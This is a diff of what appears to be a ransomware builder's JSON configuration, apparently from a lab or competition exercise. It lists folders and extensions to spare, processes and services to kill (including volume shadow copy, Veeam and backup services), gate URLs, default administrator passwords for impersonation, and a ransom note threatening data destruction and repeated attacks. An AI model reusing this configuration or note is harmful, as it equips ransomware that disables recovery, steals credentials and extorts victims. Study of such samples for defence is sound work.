@@ -30,61 +30,23 @@
       "delete_gpo_delay": 1
     },
     "white_folders": "$recycle.bin;config.msi;$windows.~bt;$windows.~ws;windows;boot;program files;program files (x86);programdata;system volume information;tor browser;windows.old;intel;msocache;perflogs;x64dbg;public;all users;default;microsoft",
-    "white_files": "GumpBit.png;autorun.inf;boot.ini;bootfont.bin;bootsect.bak;desktop.ini;iconcache.db;ntldr;ntuser.dat;ntuser.dat.log;ntuser.ini;thumbs.db;GDIPFONTCACHEV1.DAT;d3d9caps.dat",
-    "white_extens": "exe;386;adv;ani;bat;bin;cab;cmd;com;cpl;cur;deskthemepack;diagcab;diagcfg;diagpkg;dll;drv;hlp;icl;icns;ico;ics;idx;ldf;lnk;mod;mpa;msc;msp;msstyles;msu;nls;nomedia;ocx;prf;ps1;rom;rtp;scr;shs;spl;sys;theme;themepack;wpx;lock;key;hta;msi;pdb;search-ms",
+    "white_files": "GumpBit.png'autorun.inf;boot.ini;bootfont.bin;bootsect.bak;desktop.ini;iconcache.db;ntldr;ntuser.dat;ntuser.dat.log;ntuser.ini;thumbs.db;GDIPFONTCACHEV1.DAT;d3d9caps.dat",
+    "white_extens": "386;adv;ani;bat;bin;cab;cmd;com;cpl;cur;deskthemepack;diagcab;diagcfg;diagpkg;dll;drv;exe;hlp;icl;icns;ico;ics;idx;ldf;lnk;mod;mpa;msc;msp;msstyles;msu;nls;nomedia;ocx;prf;ps1;rom;rtp;scr;shs;spl;sys;theme;themepack;wpx;lock;key;hta;msi;pdb;search-ms",
     "white_hosts": "WS2019",
     "kill_processes": "sql;oracle;ocssd;dbsnmp;synctime;agntsvc;isqlplussvc;xfssvccon;mydesktopservice;ocautoupds;encsvc;firefox;tbirdconfig;mydesktopqos;ocomm;dbeng50;sqbcoreservice;excel;infopath;msaccess;mspub;onenote;outlook;powerpnt;steam;thebat;thunderbird;visio;winword;wordpad;notepad;calc;wuauclt;onedrive",
     "kill_services": "vss;sql;svc$;memtas;mepocs;msexchange;sophos;veeam;backup;GxVss;GxBlr;GxFWD;GxCVD;GxCIMgr",
     "gate_urls": "https://test.white-datasheet.com/;http://test.white-datasheet.com/",
     "impers_accounts": "ad.lab:Qwerty!;Administrator:123QWEqwe!@#;Admin2:P@ssw0rd;Administrator:P@ssw0rd;Administrator:Qwerty!;Administrator:123QWEqwe;Administrator:123QWEqweqwe",
-    "note": "ERM!
+    "note": "
+            ~~~ You've been hacked by Fortnite the Video Game (The town) ~~~
 
-You've been hacked by 
+>>>> Your data are stolen and encrypted
 
-⣿⣿⣿⣿⣿⣿⣿⠀⠀⣀⣤⣤⣄⡀⠀⠀⣤⣤⣤⣤⣤⣀⠀⠀⢠⣤⣤⣀⣀⣀⣀⣀⢀⣀⣤⡄⠀⢠⣤⣤⡄⢀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣶⣶⣶⣶⣶
-⣿⣿⣿⣿⣿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣆⠀⣿⣿⣿⣿⣿⣿⣿⣄⢸⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⡀⢸⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⡏⢸⣿⣿⣿⡀⣿⣿⣿⡏⢻⣿⣿⣿⡞⠛⢻⣿⣿⣿⠿⠿⢸⣿⣿⣿⣧⠘⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢸⣿⣿⣿⠋⠉⠉
-⣿⣿⣿⣿⣤⣤⢠⣿⣿⣿⡇⢸⣿⣿⣿⡇⣿⣿⣿⡇⢸⣿⣿⣿⡇⠀⢸⣿⣿⣿⠀⠀⢸⣿⣿⣿⣿⣆⣿⣿⡇⢸⣿⣿⣿⡇⠀⢸⣿⣿⣿⠀⠀⠈⣿⣿⣿⣤⣤⡄
-⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⡇⢸⣿⣿⣿⡇⣿⣿⣿⣷⣿⣿⣿⠟⠀⠀⢸⣿⣿⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⡇⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⡇
-⣿⣿⣿⣿⠉⠉⠈⣿⣿⣿⡇⢸⣿⣿⣿⠇⣿⣿⣿⡿⣿⣿⣿⡀⠀⠀⢸⣿⣿⣿⠀⠀⢸⣿⣿⡇⢿⣿⣿⣿⡇⢸⣿⣿⣿⡇⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿⡏
-⣿⣿⣿⣿⠀⠀⠀⢻⣿⣿⣧⣼⣿⣿⡿⠀⣿⣿⣿⡇⢿⣿⣿⣧⠀⠀⢸⣿⣿⣿⠀⠀⢸⣿⣿⡇⠘⣿⣿⣿⡇⢸⣿⣿⣿⡇⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿⣧⣤⣤
-⣿⣿⣿⣿⠀⠀⠀⠈⠻⢿⣿⣿⣿⠟⠁⠀⠿⠿⠿⠇⠸⣿⣿⣿⡆⠀⠸⠿⠿⠿⠀⠀⠸⠿⠿⠇⠀⠸⣿⣿⡇⢸⣿⣿⣿⡇⠀⢸⣿⣿⣿⠀⠀⢰⣿⣿⣿⣿⣿⣿
-⢿⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠁⠀⠈⠉⠉⠉⠀⠀⠘⠛⠛⠛⠻⠿⠿
+	The data will be DESTROYED if you do not pay the ransom 
+	Contact @Lfgberg to learn how to pay the ransom and get your data decrypted!
 
-#######                  #     #                            #####
-   #    #    # ######    #     # # #####  ######  ####     #     #   ##   #    # ######
-   #   #    # #         #     # # #    # #      #    #    #        #  #  ##  ## #
-   #    ###### #####     #     # # #    # #####  #    #    #  #### #    # # ## # #####
-   #    #    # #          #   #  # #    # #      #    #    #     # ###### #    # #
-   #    #    # #           # #   # #    # #      #    #    #     # #    # #    # #
-   #    #    # ######       #    # #####  ######  ####      #####  #    # #    # ######
+>>>> Warning! Do not DELETE or MODIFY any files, it can lead to recovery problems!
 
-   ## #######                  #######                      ##
-  #      #    #    # ######       #     ####  #    # #    #   #
- #       #    #    # #            #    #    # #    # ##   #    #
- #       #    ###### #####        #    #    # #    # # #  #    #
- #       #    #    # #            #    #    # # ## # #  # #    #
-  #      #    #    # #            #    #    # ##  ## #   ##   #
-   ##    #    #    # ######       #     ####  #    # #    # ##
-
-I bet you feel pretty stupid now, huh? This is not very cash money of you.
-
-BUT, you want to know what is?
-
-YOU'RE money. In our wallets. This is ransomware :3
-
-If you don't pay us you WILL get struck with
-
-  _______        _   _            _              _______             _             
- |__   __|      | | (_)          | |            |__   __|           (_)            
-    | | ___  ___| |_ _  ___ _   _| | __ _ _ __     | | ___  _ __ ___ _  ___  _ __  
-    | |/ _ \/ __| __| |/ __| | | | |/ _` | '__|    | |/ _ \| '__/ __| |/ _ \| '_ \ 
-    | |  __/\__ \ |_| | (__| |_| | | (_| | |       | | (_) | |  \__ \ | (_) | | | |
-    |_|\___||___/\__|_|\___|\__,_|_|\__,_|_|       |_|\___/|_|  |___/_|\___/|_| |_|
-
-
-Anyways, please contact @Lfgberg to inquire on how you can pay the $15 ransom
-
-You may get your system back if you pay us :D :p :) :0"
+>>>> Warning! If you do not pay the ransom we will attack your team repeatedly again!"
   }
-} 
+}
